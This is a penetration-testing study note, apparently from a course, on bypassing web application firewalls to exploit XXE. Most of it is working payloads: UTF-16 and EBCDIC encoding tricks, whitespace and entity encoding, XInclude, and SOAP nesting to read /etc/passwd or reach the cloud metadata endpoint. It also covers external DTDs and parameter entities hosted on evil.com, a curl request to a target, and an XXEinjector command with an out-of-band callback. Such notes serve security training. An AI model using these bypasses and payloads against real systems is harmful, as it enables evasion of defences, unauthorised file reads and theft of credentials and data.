---
tags: [vapt, xxe, intermediate]
difficulty: intermediate
module: "14 - XXE"
topic: "14.09 XXE WAF Bypass (encoding, whitespace)"
---

# 14.09 — XXE WAF Bypass

## What WAFs Block for XXE

```
COMMON WAF XXE DETECTIONS:
  ✓ Blocks: <!DOCTYPE
  ✓ Blocks: <!ENTITY
  ✓ Blocks: SYSTEM
  ✓ Blocks: PUBLIC
  ✓ Blocks: file://
  ✓ Blocks: /etc/passwd
  ✓ Blocks: 169.254.169.254
  ✓ Blocks: %entity (parameter entity percent sign)
  
  BYPASSES BELOW WORK BECAUSE:
  - WAF uses regex/string matching on raw bytes
  - XML parsers are more lenient with whitespace and encoding
  - WAF may only check the start of the payload
  - WAF may not decode all encoding forms
```

---

## Bypass 1 — Encoding Changes

```xml
<!-- CHANGE XML ENCODING TO BYPASS BYTE-BASED DETECTION: -->

<!-- UTF-16 ENCODING: -->
<!-- Convert payload to UTF-16 before sending -->
<!-- WAF sees different bytes → string match fails! -->
<!-- XML parser decodes UTF-16 → parses entities normally! -->

# CONVERT TO UTF-16 WITH PYTHON:
python3 -c "
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>'''
with open('payload_utf16.xml', 'wb') as f:
    f.write(payload.encode('utf-16'))
"

# SEND UTF-16 XML:
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml; charset=utf-16" \
  --data-binary @payload_utf16.xml

# ALSO TRY:
# encoding="UTF-16BE"
# encoding="IBM037"  (EBCDIC encoding!)
# encoding="IBM500"
# These obscure encodings may bypass WAF signature detection
```

---

## Bypass 2 — Whitespace and Comment Insertion

```xml
<!-- INSERT WHITESPACE AND COMMENTS: -->

<!-- NORMAL (blocked): -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- WHITESPACE BYPASS: -->
<!DOCTYPE
  root
  [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]
>

<!-- XML COMMENT BYPASS: -->
<!DOCTYPE root [<!ENTITY xxe <!--comment-->SYSTEM "file:///etc/passwd">]>
<!-- Not always valid but worth trying! -->

<!-- CDATA IN DOCTYPE (sometimes confuses WAFs): -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///et&#x63;/passwd">
]>
<!-- &#x63; = 'c' — entity-encoded character in URL! -->
```

---

## Bypass 3 — Character Entity Encoding

```xml
<!-- ENCODE CHARACTERS IN THE SYSTEM URL: -->

<!-- /etc/passwd → using XML entities: -->
<!ENTITY xxe SYSTEM "file:///et&#x63;/passwd">
<!-- &#x63; = 'c' in hex -->

<!-- ENCODE SLASHES: -->
<!ENTITY xxe SYSTEM "file:&#x2f;&#x2f;&#x2f;etc&#x2f;passwd">
<!-- &#x2f; = '/' -->

<!-- ENCODE DOTS: -->
<!ENTITY xxe SYSTEM "file:///etc/passwd&#x00;">
<!-- Null byte at end — might confuse WAF string matching -->

<!-- PERCENT ENCODING (for HTTP URLs in SSRF): -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/%6c%61%74%65%73%74/meta-data/">
<!-- %6c%61%74%65%73%74 = "latest" -->
```

---

## Bypass 4 — XInclude (Avoids DOCTYPE Entirely)

```xml
<!-- IF WAF BLOCKS DOCTYPE/ENTITY:
     Use XInclude which doesn't need DOCTYPE! -->

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>

<!-- This bypasses any WAF that only looks for <!DOCTYPE or <!ENTITY! -->
```

---

## Bypass 5 — External DTD Reference Only

```xml
<!-- IF WAF BLOCKS INLINE ENTITY DEFINITIONS:
     Define entities in external DTD (move them out of the XML body!) -->

<!-- ATTACK XML (no local entity definitions!): -->
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://evil.com/evil.dtd">
<root><data>test</data></root>

<!-- evil.dtd (hosted on evil.com): -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- The XML body contains no suspicious strings!
     WAF sees: <!DOCTYPE root SYSTEM "http://..."  → may allow
     Actual XXE is inside evil.dtd on your server!
-->
```

---

## Bypass 6 — Use Parameter Entities Only

```xml
<!-- PARAMETER ENTITIES (starting with %) are processed differently
     and may bypass WAFs looking only for regular entities: -->

<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>

<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY xxe "%file;">
<!-- The final entity &xxe; is defined in external DTD! -->
```

---

## Bypass 7 — SOAP / Nested XML Envelopes

```xml
<!-- SOME SOAP WAFs ONLY CHECK OUTER ELEMENT:
     Nest XXE inside SOAP envelope in unexpected places -->

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    <!-- XXE here might be less inspected: -->
    <!DOCTYPE header [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    &xxe;
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <normal>request</normal>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

---

## Testing XXE Bypass Systematically

```bash
# BURP INTRUDER APPROACH:
# 1. Find XML endpoint
# 2. Use Intruder with payload position in:
#    - DOCTYPE declaration variations
#    - Encoding of the URL
#    - Different entity names (xxe vs x vs entity vs inject)
#    - Different file paths (/etc/passwd vs /etc/hosts vs /proc/self/environ)

# AUTOMATED: XXEinjector
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb --host=YOUR_IP --file=request.txt --path=/etc/passwd --oob=http

# AUTOMATED: XXE Fuzzer in Burp Extensions
# BApp Store → "XXE Injector"
```

---

## Related Notes
- [[03 - Classic XXE File Read]] — basic payloads
- [[07 - XXE via XInclude]] — DOCTYPE-free bypass
- [[06 - Blind XXE OOB]] — OOB when direct read blocked
- [[10 - Defense Disable External Entity Processing]] — defense
